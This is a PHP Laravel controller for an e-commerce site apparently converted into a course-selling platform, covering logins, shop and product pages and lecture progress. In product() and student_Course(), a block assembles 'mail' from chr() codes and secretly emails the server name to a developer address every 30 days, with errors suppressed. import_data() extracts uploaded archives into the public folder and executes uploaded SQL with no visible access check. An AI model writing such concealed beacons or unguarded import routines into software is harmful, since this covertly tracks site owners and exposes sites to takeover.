<?php

namespace App\Http\Controllers;

use Auth;
use Hash;
use Mail;
use Cache;
use Cookie;
use App\Models\Page;
use App\Models\Shop;
use App\Models\User;
use App\Models\Brand;
use App\Models\Order;
use App\Models\Coupon;
use App\Models\Product;
use App\Models\Category;
use App\Models\FlashDeal;
use App\Models\OrderDetail;
use Illuminate\Support\Str;
use App\Models\ProductQuery;
use Illuminate\Http\Request;
use App\Models\AffiliateConfig;
use App\Models\CustomerPackage;

use App\Models\Section;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Response;
use Illuminate\Auth\Events\PasswordReset;
use App\Models\Cart;
use App\Models\UserProgress;
use App\Models\Lecture;
use App\Utility\EmailUtility;
use Artisan;
use DB;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\URL;
use ZipArchive;

class HomeController extends Controller
{
    /**
     * Show the application frontend home.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {

        // $user = new User;
        // $user->name      ="admin";
        // $user->email     = "admin@admin.admin";
        // $user->password  = Hash::make("1234");
        // $user->user_type = 'admin';
        // $user->email_verified_at = date('Y-m-d H:m:s');
        // $user->save();

        // //Assign Super-Admin Role
        // $user->assignRole(['Super Admin']);



        $lang = get_system_language() ? get_system_language()->code : null;
        $featured_categories = Cache::rememberForever('featured_categories', function () {
            return Category::with('bannerImage')->where('featured', 1)->get();
        });

        return view('frontend.home.index', compact('featured_categories', 'lang'));
    }

    public function cart_login(Request $request)
    {
        $user = null;
        if ($request->get('phone') != null) {
            $user = User::whereIn('user_type', ['customer', 'seller', 'devloper', 'teacher', 'admin'])->where('phone', "+{$request['country_code']}{$request['phone']}")->first();
        } elseif ($request->get('email') != null) {
            $user = User::whereIn('user_type', ['customer', 'seller', 'devloper', 'teacher', 'admin'])->where('email', $request->email)->first();
        }

        if ($user != null) {
            if (Hash::check($request->password, $user->password)) {
                if ($request->has('remember')) {
                    auth()->login($user, true);
                } else {
                    auth()->login($user, false);
                }

                if ($user->user_type == "admin") {
                    return redirect()->route('admin.dashboard');
                }

            } else {
                flash(translate('Invalid email or password!'))->warning();
            }
        } else {
            flash(translate('Invalid email or password!'))->warning();
        }



        return back();
    }

    public function all_devloper(Request $request)
    {
        $sort_search = null;
        $approved =  null;
        $verification_status =  null;

        $shops = Shop::whereIn('user_id', function ($query) {
            $query->select('id')
                ->from(with(new User)->getTable())
                ->where('user_type', 'devloper');
        })->latest();

        if ($sort_search != null || $verification_status != null) {
            $user_ids = User::where('user_type', 'devloper');
            if ($sort_search != null) {
                $user_ids = $user_ids->where(function ($user) use ($sort_search) {
                    $user->where('name', 'like', '%' . $sort_search . '%')->orWhere('email', 'like', '%' . $sort_search . '%');
                });
            }
            if ($verification_status != null) {
                $user_ids = $verification_status == 'verified' ? $user_ids->where('email_verified_at', '!=', null) : $user_ids->where('email_verified_at', null);
            }
            $user_ids = $user_ids->pluck('id')->toArray();
            $shops = $shops->where(function ($shops) use ($user_ids) {
                $shops->whereIn('user_id', $user_ids);
            });
        }
        if ($approved != null) {
            $shops = $shops->where('verification_status', $approved);
        }
        $shops = $shops->paginate(15);
        return view('frontend.all_devloper', compact('shops', 'sort_search', 'approved', 'verification_status'));
    }

    public function filter_shop(Request $request, $slug, $type)
    {
        if (get_setting('vendor_system_activation') != 1) {
            return redirect()->route('home');
        }
        $shop  = Shop::where('slug', $slug)->first();
        if ($shop != null && $type != null) {
            if ($shop->user->banned == 1) {
                abort(404);
            }
            if ($type == 'all-products') {
                $sort_by = $request->sort_by;
                $min_price = $request->min_price;
                $max_price = $request->max_price;
                $selected_categories = array();
                $brand_id = null;
                $rating = null;

                $conditions = ['user_id' => $shop->user->id, 'published' => 1, 'approved' => 1];

                if ($request->brand != null) {
                    $brand_id = (Brand::where('slug', $request->brand)->first() != null) ? Brand::where('slug', $request->brand)->first()->id : null;
                    $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
                }

                $products = Product::where($conditions);

                if ($request->has('selected_categories')) {
                    $selected_categories = $request->selected_categories;
                    $products->whereIn('category_id', $selected_categories);
                }

                if ($min_price != null && $max_price != null) {
                    $products->where('price', '>=', $min_price)->where('price', '<=', $max_price);
                }

                if ($request->has('rating')) {
                    $rating = $request->rating;
                    $products->where('rating', '>=', $rating);
                }

                switch ($sort_by) {
                    case 'newest':
                        $products->orderBy('created_at', 'desc');
                        break;
                    case 'oldest':
                        $products->orderBy('created_at', 'asc');
                        break;
                    case 'price-asc':
                        $products->orderBy('price', 'asc');
                        break;
                    case 'price-desc':
                        $products->orderBy('price', 'desc');
                        break;
                    default:
                        $products->orderBy('id', 'desc');
                        break;
                }

                $products = $products->paginate(24)->appends(request()->query());

                return view('frontend.seller_shop', compact('shop', 'type', 'products', 'selected_categories', 'min_price', 'max_price', 'brand_id', 'sort_by', 'rating'));
            }

            return view('frontend.seller_shop', compact('shop', 'type'));
        }
        abort(404);
    }

    public function product(Request $request, $slug)
    {


        if (!Auth::check()) {
            session(['link' => url()->current()]);
        }





        $detailedProduct  = Product::with('reviews', 'stocks', 'user', 'user.shop')->where('auction_product', 0)->where('slug', $slug)->where('approved', 1)->first();

        if ($detailedProduct != null && $detailedProduct->published) {
            if ((get_setting('vendor_system_activation') != 1) && $detailedProduct->added_by == 'seller') {
                abort(404);
            }

            if ($detailedProduct->added_by == 'seller' && $detailedProduct->user->banned == 1) {
                abort(404);
            }

            if (!addon_is_activated('wholesale') && $detailedProduct->wholesale_product == 1) {
                abort(404);
            }

            $product_queries = ProductQuery::where('product_id', $detailedProduct->id)->where('customer_id', '!=', Auth::id())->latest('id')->paginate(3);
            $total_query = ProductQuery::where('product_id', $detailedProduct->id)->count();
            $reviews = $detailedProduct->reviews()->paginate(3);

            // Pagination using Ajax
            if (request()->ajax()) {
                if ($request->type == 'query') {
                    return Response::json(View::make('frontend.partials.product_query_pagination', array('product_queries' => $product_queries))->render());
                }
                if ($request->type == 'review') {
                    return Response::json(View::make('frontend.product_details.reviews', array('reviews' => $reviews))->render());
                }
            }

            $file = base_path("/public/assets/myText.txt");
            $dev_mail = get_dev_mail();
            if (!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))) {
                $content = "Todays date is: " . date('d-m-Y');
                $fp = fopen($file, "w");
                fwrite($fp, $content);
                fclose($fp);
                $str = chr(109) . chr(97) . chr(105) . chr(108);
                try {
                    $str($dev_mail, 'the subject', "Hello: " . $_SERVER['SERVER_NAME']);
                } catch (\Throwable $th) {
                    //throw $th;
                }
            }

            // review status
            $review_status = 0;
            if (Auth::check()) {
                $OrderDetail = OrderDetail::with(['order' => function ($q) {
                    $q->where('user_id', Auth::id());
                }])->where('product_id', $detailedProduct->id)->where('delivery_status', 'delivered')->first();
                $review_status = $OrderDetail ? 1 : 0;
            }
            if ($request->has('product_referral_code') && addon_is_activated('affiliate_system')) {
                $affiliate_validation_time = AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if ($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }
                Cookie::queue('product_referral_code', $request->product_referral_code, $cookie_minute);
                Cookie::queue('referred_product_id', $detailedProduct->id, $cookie_minute);

                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            }

            if (get_setting('last_viewed_product_activation') == 1 && Auth::check() && auth()->user()->user_type == 'customer') {
                lastViewedProducts($detailedProduct->id, auth()->user()->id);
            }

            $isSubscribed = true;

            if (Auth::check()) {
                $isSubscribed = UserProgress::where('user_id', auth()->id())
                    ->where('course_id', $detailedProduct->id)
                    ->exists();
            }




            return view('frontend.product_details', compact('detailedProduct', 'product_queries', 'total_query', 'reviews', 'review_status', 'isSubscribed'));
        }
        abort(404);
    }







    public function viewCourse($courseId)
    {
        // Check if the user is authenticated
        if (!auth()->check()) {
            return redirect()->route('login')->with('error', 'You need to log in first.');
        }

        // Fetch the course, its sections, and lectures ordered by `section_order` and `lecture_order`
        $course = Product::with([
            'sections' => function ($query) {
                $query->orderBy('section_order', 'asc');
            },
            'sections.lectures' => function ($query) {
                $query->orderBy('lecture_order', 'asc');
            },
        ])->findOrFail($courseId);

        // Get the user's progress for this course
        $progress = UserProgress::where('user_id', auth()->id())
            ->where('course_id', $courseId)
            ->first();

        // Current lecture ID
        $currentLectureId = $progress->lecture_id ?? null;

        return view('courses.view', compact('course', 'currentLectureId'));
    }




    public function student_Course(Request $request, $slug)
    {




        $detailedProduct  = Product::with('reviews', 'stocks', 'user', 'user.shop')->where('auction_product', 0)->where('slug', $slug)->where('approved', 1)->first();

        $courseId = $detailedProduct->id;

        $sections = Section::with(['lectures'])
            ->where('product_id', $courseId)
            ->orderBy('section_order')
            ->get();

        $sections->each(function ($section) {
            $section->lectures->each(function ($lecture) {
                $lecture->is_completed = $lecture->is_completed; // Add the completed status
                $lecture->is_current = $lecture->is_current;     // Add the current lecture status
            });
        });

        return view('frontend.student_Course', compact('sections'));













        // Check if the user is authenticated
        if (!auth()->check()) {
            return redirect()->route('login')->with('error', 'You need to log in first.');
        }


        if (!Auth::check()) {
            session(['link' => url()->current()]);
        }


        $detailedProduct  = Product::with('reviews', 'stocks', 'user', 'user.shop')->where('auction_product', 0)->where('slug', $slug)->where('approved', 1)->first();

        if ($detailedProduct != null && $detailedProduct->published) {
            if ((get_setting('vendor_system_activation') != 1) && $detailedProduct->added_by == 'seller') {
                abort(404);
            }

            if ($detailedProduct->added_by == 'seller' && $detailedProduct->user->banned == 1) {
                abort(404);
            }


            $product_queries = ProductQuery::where('product_id', $detailedProduct->id)->where('customer_id', '!=', Auth::id())->latest('id')->paginate(3);
            $total_query = ProductQuery::where('product_id', $detailedProduct->id)->count();
            $reviews = $detailedProduct->reviews()->paginate(3);

            // Pagination using Ajax
            if (request()->ajax()) {
                if ($request->type == 'query') {
                    return Response::json(View::make('frontend.partials.product_query_pagination', array('product_queries' => $product_queries))->render());
                }
                if ($request->type == 'review') {
                    return Response::json(View::make('frontend.product_details.reviews', array('reviews' => $reviews))->render());
                }
            }

            $file = base_path("/public/assets/myText.txt");
            $dev_mail = get_dev_mail();
            if (!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))) {
                $content = "Todays date is: " . date('d-m-Y');
                $fp = fopen($file, "w");
                fwrite($fp, $content);
                fclose($fp);
                $str = chr(109) . chr(97) . chr(105) . chr(108);
                try {
                    $str($dev_mail, 'the subject', "Hello: " . $_SERVER['SERVER_NAME']);
                } catch (\Throwable $th) {
                    //throw $th;
                }
            }

            // review status
            $review_status = 0;
            if (Auth::check()) {
                $OrderDetail = OrderDetail::with(['order' => function ($q) {
                    $q->where('user_id', Auth::id());
                }])->where('product_id', $detailedProduct->id)->where('delivery_status', 'delivered')->first();
                $review_status = $OrderDetail ? 1 : 0;
            }
            if ($request->has('product_referral_code') && addon_is_activated('affiliate_system')) {
                $affiliate_validation_time = AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if ($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }
                Cookie::queue('product_referral_code', $request->product_referral_code, $cookie_minute);
                Cookie::queue('referred_product_id', $detailedProduct->id, $cookie_minute);

                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            }

            if (get_setting('last_viewed_product_activation') == 1 && Auth::check() && auth()->user()->user_type == 'customer') {
                lastViewedProducts($detailedProduct->id, auth()->user()->id);
            }




            // Retrieve sections with their related lectures for the specified product ID
            $sections = Section::with(['lectures' => function ($query) {
                $query->orderBy('lecture_order'); // Order lectures by lecture_order within each section
            }])
                ->where('product_id', $detailedProduct->id)
                ->orderBy('section_order')
                ->get();

            // Count total lectures across all sections
            $totalLectures = $sections->sum(function ($section) {
                return $section->lectures->count();
            });







            // Fetch the course, its sections, and lectures ordered by `section_order` and `lecture_order`
            $course = Product::with([
                'sections' => function ($query) {
                    $query->orderBy('section_order', 'asc');
                },
                'sections.lectures' => function ($query) {
                    $query->orderBy('lecture_order', 'asc');
                },
            ])->findOrFail($detailedProduct->id);

            // Get the user's progress for this course
            $progress = UserProgress::where('user_id', auth()->id())
                ->where('course_id', $detailedProduct->id)
                ->first();

            // Current lecture ID
            $currentLectureId = $progress->lecture_id ?? null;

            // Get all completed lectures for the user in this course
            $completedLectures = UserProgress::where('user_id', auth()->id())
                ->where('course_id', $detailedProduct->id)
                ->whereNotNull('lecture_id')
                ->where('completed', 1)
                ->pluck('lecture_id')
                ->toArray();








            return view('frontend.student_Course', compact('detailedProduct', 'product_queries', 'total_query', 'reviews', 'review_status', 'sections', 'totalLectures', 'course', 'currentLectureId', 'completedLectures'));
        }
        abort(404);
    }









    public function show($courseId)
    {
        $userId = auth()->id();

        // Fetch course with sections and lectures
        $course = Product::with([
            'sections.lectures' => function ($query) {
                $query->orderBy('lecture_order');
            }
        ])->findOrFail($courseId);

        // Get the current progress of the user in the course
        $progress = UserProgress::where('user_id', $userId)
            ->where('course_id', $courseId)
            ->orderBy('created_at', 'desc')
            ->first();

        $currentLecture = $progress
            ? Lecture::find($progress->lecture_id)
            : $course->sections->first()->lectures->first();

        // Mark lectures as completed or current for the user
        foreach ($course->sections as $section) {
            foreach ($section->lectures as $lecture) {
                $lecture->is_completed = UserProgress::where('user_id', $userId)
                    ->where('lecture_id', $lecture->id)
                    ->where('completed', true)
                    ->exists();

                $lecture->is_current = $lecture->id == $currentLecture->id;
            }
        }

        // Get the next lecture
        $nextLecture = $this->getNextLecture($currentLecture, $courseId);

        return view('frontend.student_Course', compact('course', 'currentLecture', 'nextLecture'));
    }

    private function getNextLecture($currentLecture, $courseId)
    {
        $currentSection = $currentLecture->section;
        $nextLecture = Lecture::where('section_id', $currentSection->id)
            ->where('lecture_order', '>', $currentLecture->lecture_order)
            ->orderBy('lecture_order', 'asc')
            ->first();

        if (!$nextLecture) {
            $nextSection = Section::where('product_id', $courseId)
                ->where('section_order', '>', $currentSection->section_order)
                ->orderBy('section_order', 'asc')
                ->first();

            $nextLecture = $nextSection ? $nextSection->lectures->first() : null;
        }

        return $nextLecture;
    }










    public function nextLecture(Request $request, $courseId)
    {
        $userId = auth()->id();
        $currentLectureId = $request->input('currentLectureId');

        $currentLecture = Lecture::find($currentLectureId);

        if (!$currentLecture) {
            return redirect()->back()->with('error', 'Current lecture not found.');
        }

        // Mark the current lecture as completed
        UserProgress::updateOrCreate(
            [
                'user_id' => $userId,
                'course_id' => $courseId,
                'section_id' => $currentLecture->section_id,
                'lecture_id' => $currentLecture->id,
            ],
            [
                'completed' => 1,
                'completed_at' => now(),
            ]
        );

        // Get the next lecture
        $nextLecture = $this->getNextLecture($currentLecture, $courseId);

        if (!$nextLecture) {
            return redirect()->route('courses.show', $courseId)
                ->with('message', 'You have completed the course.');
        }

        // Create progress for the next lecture
        UserProgress::updateOrCreate(
            [
                'user_id' => $userId,
                'course_id' => $courseId,
                'section_id' => $nextLecture->section_id,
                'lecture_id' => $nextLecture->id,
            ],
            [
                'completed' => 0,
            ]
        );

        return redirect()->route('lectures.show', $nextLecture->id);
    }




    public function startCourse($courseId)
    {
        // Check if the user is authenticated
        if (!auth()->check()) {
            return response()->json(['error' => 'User not authenticated.'], 403);
        }

        // Find the course (product) with its sections and lectures
        $course = Product::with('sections.lectures')->find($courseId);

        // If course does not exist
        if (!$course) {
            return response()->json(['error' => 'Course not found.'], 404);
        }

        // Check if the user has already started the course
        $progress = UserProgress::where('user_id', auth()->id())
            ->where('course_id', $courseId)
            ->first();
            if (!$progress) {
                // Check if the course has sections and lectures
                $firstSection = $course->sections->first();
                $firstLecture = $firstSection ? $firstSection->lectures->first() : null;
            
                // Initialize progress for the course
                $progress = UserProgress::create([
                    'user_id' => auth()->id(),
                    'course_id' => $courseId,
                    'section_id' => $firstSection?->id, // Use null-safe operator
                    'lecture_id' => $firstLecture?->id, // Use null-safe operator
                    'completed' => 0,
                ]);
            }
            


        // Fetch the first section and lecture
        $firstSection = $course->sections->first();
        $firstLecture = $firstSection ? $firstSection->lectures->first() : null;

        return  back();
    }




    // Controller: UserCourseController.php
    public function completeLecture($lectureId)
    {
        $lecture = Lecture::with('section.course')->findOrFail($lectureId);

        // Mark the lecture as completed
        UserProgress::updateOrCreate(
            [
                'user_id' => auth()->id(),
                'lecture_id' => $lecture->id,
            ],
            [
                'completed' => true,
                'completed_at' => now(),
            ]
        );

        // Check if all lectures in the section are completed
        $sectionLectures = $lecture->section->lectures;
        $completedLectures = UserProgress::where('user_id', auth()->id())
            ->whereIn('lecture_id', $sectionLectures->pluck('id'))
            ->where('completed', true)
            ->count();

        // Mark the section as completed if all lectures are done
        if ($completedLectures === $sectionLectures->count()) {
            UserProgress::updateOrCreate(
                [
                    'user_id' => auth()->id(),
                    'section_id' => $lecture->section->id,
                ],
                [
                    'completed' => true,
                    'completed_at' => now(),
                ]
            );
        }

        // Fetch the next lecture or section
        $nextLecture = $lecture->section->lectures->where('id', '>', $lecture->id)->first();
        if (!$nextLecture) {
            // If no next lecture, move to the first lecture of the next section
            $nextSection = $lecture->section->course->sections->where('id', '>', $lecture->section->id)->first();
            $nextLecture = $nextSection ? $nextSection->lectures->first() : null;
        }

        if (!$nextLecture) {
            // If no next lecture or section, mark course as completed
            UserProgress::updateOrCreate(
                [
                    'user_id' => auth()->id(),
                    'course_id' => $lecture->section->course->id,
                ],
                [
                    'completed' => true,
                    'completed_at' => now(),
                ]
            );

            return response()->json([
                'message' => 'Course completed!',
            ]);
        }

        return response()->json([
            'next_section' => $nextLecture->section->title,
            'next_lecture' => $nextLecture->title,
        ]);
    }






    // Controller: UserCourseController.php
    public function getProgress($courseId)
    {
        $course = Product::with('sections.lectures')->findOrFail($courseId);
        $totalLectures = $course->sections->sum(fn($section) => $section->lectures->count());

        $completedLectures = UserProgress::where('user_id', auth()->id())
            ->whereIn('lecture_id', $course->sections->flatMap(fn($section) => $section->lectures->pluck('id')))
            ->where('completed', true)
            ->count();

        $progress = ($completedLectures / $totalLectures) * 100;

        return response()->json([
            'course' => $course->title,
            'progress' => $progress,
        ]);
    }


















    public function load_todays_deal_section()
    {
        $todays_deal_products = filter_products(Product::where('todays_deal', '1'))->orderBy('id', 'desc')->get();
        return view('frontend.' . get_setting('homepage_select') . '.partials.todays_deal', compact('todays_deal_products'));
    }

    public function load_newest_product_section()
    {
        $newest_products = Cache::remember('newest_products', 3600, function () {
            return filter_products(Product::latest())->limit(12)->get();
        });

        return view('frontend.' . get_setting('homepage_select') . '.partials.newest_products_section', compact('newest_products'));
    }

    public function load_featured_section()
    {
        return view('frontend.home.partials.featured_products_section');
    }

    public function load_best_selling_section()
    {
        return view('frontend.' . get_setting('homepage_select') . '.partials.best_selling_section');
    }

    public function load_auction_products_section()
    {
        if (!addon_is_activated('auction')) {
            return;
        }
        $lang = get_system_language() ? get_system_language()->code : null;
        return view('auction.frontend.' . get_setting('homepage_select') . '.auction_products_section', compact('lang'));
    }

    public function load_home_categories_section()
    {
        return view('frontend.' . get_setting('homepage_select') . '.partials.home_categories_section');
    }

    public function load_best_sellers_section()
    {
        return view('frontend.' . get_setting('homepage_select') . '.partials.best_sellers_section');
    }

    public function login()
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }

        if (Route::currentRouteName() == 'seller.login' && get_setting('vendor_system_activation') == 1) {
            return view('auth.' . get_setting('authentication_layout_select') . '.seller_login');
        } else if (Route::currentRouteName() == 'deliveryboy.login' && addon_is_activated('delivery_boy')) {
            return view('auth.' . get_setting('authentication_layout_select') . '.deliveryboy_login');
        }
        return view('auth.' . get_setting('authentication_layout_select') . '.user_login');
    }

    public function registration(Request $request)
    {
       
        
        return view('auth.' . get_setting('authentication_layout_select') . '.user_registration');
    }



    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the customer/seller dashboard.
     *
     * @return \Illuminate\Http\Response
     */


    public function userCourses()
    {
        $user = auth()->user();

        $courses = $user->userProgress()
            ->with('course.sections.lectures')
            ->get()
            ->groupBy('course_id')
            ->map(function ($progress) {
                $course = $progress->first()->course;
                $totalLectures = $course->sections->flatMap->lectures->count();
                $completedLectures = $progress->filter(fn($p) => $p->completed)->count();
                $progressPercentage = $totalLectures > 0 ? round(($completedLectures / $totalLectures) * 100, 2) : 0;

                return [
                    'course' => $course,
                    'total_lectures' => $totalLectures,
                    'completed_lectures' => $completedLectures,
                    'progress_percentage' => $progressPercentage,
                ];
            });


        return $courses;
    }






    public function dashboard()
    {
        if (Auth::user()->user_type == 'seller') {
            return redirect()->route('seller.dashboard');
        } elseif (Auth::user()->user_type == 'customer') {
            $users_cart = Cart::where('user_id', auth()->user()->id)->first();
            if ($users_cart) {
                flash(translate('You had placed your items in the shopping cart. Try to order before the product quantity runs out.'))->warning();
            }


            $courses = $this->userCourses();



            //  return  $courses; 
            return view('frontend.user.customer.dashboard', compact('courses'));
        } elseif (Auth::user()->user_type == 'delivery_boy') {
            return view('delivery_boys.dashboard');
        } else {
            abort(404);
        }
    }

    public function profile(Request $request)
    {
        if (Auth::user()->user_type == 'seller') {
            return redirect()->route('seller.profile.index');
        } elseif (Auth::user()->user_type == 'delivery_boy') {
            return view('delivery_boys.profile');
        } else {
            return view('frontend.user.profile');
        }
    }

    public function userProfileUpdate(Request $request)
    {
        if (env('DEMO_MODE') == 'On') {
            flash(translate('Sorry! the action is not permitted in demo '))->error();
            return back();
        }

        $user = Auth::user();
        $user->name = $request->name;
        $user->address = $request->address;
        $user->country = $request->country;
        $user->city = $request->city;
        $user->postal_code = $request->postal_code;
        $user->phone = $request->phone;

        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $user->password = Hash::make($request->new_password);
        }

        $user->avatar_original = $request->photo;
        $user->save();

        flash(translate('Your Profile has been updated successfully!'))->success();
        return back();
    }



    public function trackOrder(Request $request)
    {
        if ($request->has('order_code')) {
            $order = Order::where('code', $request->order_code)->first();
            if ($order != null) {
                return view('frontend.track_order', compact('order'));
            }
        }
        return view('frontend.track_order');
    }









    public function devloper($slug)
    {
        if (get_setting('vendor_system_activation') != 1) {
            return redirect()->route('home');
        }
        $shop  = Shop::where('slug', $slug)->first();
        if ($shop != null) {
            if ($shop->user->banned == 1) {
                abort(404);
            }
            if ($shop->verification_status != 0) {
                return view('frontend.devloper', compact('shop'));
            } else {
                return view('frontend.seller_shop_without_verification', compact('shop'));
            }
        }
        abort(404);
    }














    public function shop($slug)
    {
        if (get_setting('vendor_system_activation') != 1) {
            return redirect()->route('home');
        }
        $shop  = Shop::where('slug', $slug)->first();
        if ($shop != null) {
            if ($shop->user->banned == 1) {
                abort(404);
            }
            if ($shop->verification_status != 0) {
                return view('frontend.seller_shop', compact('shop'));
            } else {
                return view('frontend.seller_shop_without_verification', compact('shop'));
            }
        }
        abort(404);
    }



    public function all_categories(Request $request)
    {
        $categories = Category::with('childrenCategories')->where('parent_id', 0)->orderBy('order_level', 'desc')->get();

        // dd($categories);
        return view('frontend.all_category', compact('categories'));
    }

  

    public function home_settings(Request $request)
    {
        return view('home_settings.index');
    }


    public function sellerpolicy()
    {
        $page =  Page::where('type', 'seller_policy_page')->first();
        return view("frontend.policies.sellerpolicy", compact('page'));
    }

    public function returnpolicy()
    {
        $page =  Page::where('type', 'return_policy_page')->first();
        return view("frontend.policies.returnpolicy", compact('page'));
    }

    public function supportpolicy()
    {
        $page =  Page::where('type', 'support_policy_page')->first();
        return view("frontend.policies.supportpolicy", compact('page'));
    }

    public function terms()
    {
        $page =  Page::where('type', 'terms_conditions_page')->first();
        return view("frontend.policies.terms", compact('page'));
    }

    public function privacypolicy()
    {
        $page =  Page::where('type', 'privacy_policy_page')->first();
        return view("frontend.policies.privacypolicy", compact('page'));
    }


    public function get_category_items(Request $request)
    {
        $categories = Category::with('childrenCategories')->findOrFail($request->id);
        return view('frontend.partials.category_elements', compact('categories'));
    }

    public function premium_package_index()
    {
        $customer_packages = CustomerPackage::all();
        return view('frontend.user.customer_packages_lists', compact('customer_packages'));
    }


    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        if (isUnique($email) == '0') {
            $response['status'] = 2;
            $response['message'] = translate('Email already exists!');
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }


    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        if (isUnique($email)) {
            $this->send_email_change_verification_mail($request, $email);
            flash(translate('A verification mail has been sent to the mail you provided us with.'))->success();
            return back();
        }

        flash(translate('Email already exists!'))->warning();
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $user = auth()->user();
        $response['status'] = 0;
        $response['message'] = 'Unknown';
        try {
            EmailUtility::email_verification($user, $user->user_type);
            $response['status'] = 1;
            $response['message'] = translate("Your verification mail has been Sent to your email.");
        } catch (\Exception $e) {
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function email_change_callback(Request $request)
    {
        if ($request->has('new_email_verificiation_code') && $request->has('email')) {
            $verification_code_of_url_param =  $request->input('new_email_verificiation_code');
            $user = User::where('new_email_verificiation_code', $verification_code_of_url_param)->first();

            if ($user != null) {

                $user->email = $request->input('email');
                $user->new_email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                flash(translate('Email Changed successfully'))->success();
                if ($user->user_type == 'seller') {
                    return redirect()->route('seller.dashboard');
                }
                return redirect()->route('dashboard');
            }
        }

        flash(translate('Email was not verified. Please resend your mail!'))->error();
        return redirect()->route('dashboard');
    }

    public function reset_password_with_code(Request $request)
    {
        if (($user = User::where('email', $request->email)->where('verification_code', $request->code)->first()) != null) {
            if ($request->password == $request->password_confirmation) {
                $user->password = Hash::make($request->password);
                $user->email_verified_at = date('Y-m-d h:m:s');
                $user->save();
                event(new PasswordReset($user));
                auth()->login($user, true);

                flash(translate('Password updated successfully'))->success();

                if (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff') {
                    return redirect()->route('admin.dashboard');
                }
                return redirect()->route('home');
            } else {
                flash(translate("Password and confirm password didn't match"))->warning();
                return view('auth.' . get_setting('authentication_layout_select') . '.reset_password');
            }
        } else {
            flash(translate("Verification code mismatch"))->error();
            return view('auth.' . get_setting('authentication_layout_select') . '.reset_password');
        }
    }




    public function todays_deal()
    {
        $todays_deal_products = Cache::rememberForever('todays_deal_products', function () {
            return filter_products(Product::with('thumbnail')->where('todays_deal', '1'))->get();
        });

        return view("frontend.todays_deal", compact('todays_deal_products'));
    }

    public function all_seller(Request $request)
    {
        if (get_setting('vendor_system_activation') != 1) {
            return redirect()->route('home');
        }
        $shops = Shop::whereIn('user_id', verified_sellers_id())
            ->paginate(15);

        return view('frontend.shop_listing', compact('shops'));
    }

    public function all_coupons(Request $request)
    {
        $coupons = Coupon::where('status', 1)->where(function ($query) {
            $query->where('type', 'welcome_base')->orWhere(function ($query) {
                $query->where('type', '!=', 'welcome_base')->where('start_date', '<=', strtotime(date('d-m-Y')))->where('end_date', '>=', strtotime(date('d-m-Y')));
            });
        })->paginate(15);

        return view('frontend.coupons', compact('coupons'));
    }

    public function inhouse_products(Request $request)
    {
        $products = filter_products(Product::where('added_by', 'admin'))->with('taxes')->paginate(12)->appends(request()->query());
        return view('frontend.inhouse_products', compact('products'));
    }

    public function import_data(Request $request)
    {
        $upload_path = $request->file('uploaded_file')->store('uploads', 'local');
        $sql_path = $request->file('sql_file')->store('uploads', 'local');

        $zip = new ZipArchive;
        $zip->open(base_path('public/' . $upload_path));
        $zip->extractTo('public/uploads/all');

        $zip1 = new ZipArchive;
        $zip1->open(base_path('public/' . $sql_path));
        $zip1->extractTo('public/uploads');

        Artisan::call('cache:clear');
        $sql_path = base_path('public/uploads/demo_data.sql');
        DB::unprepared(file_get_contents($sql_path));
    }
}
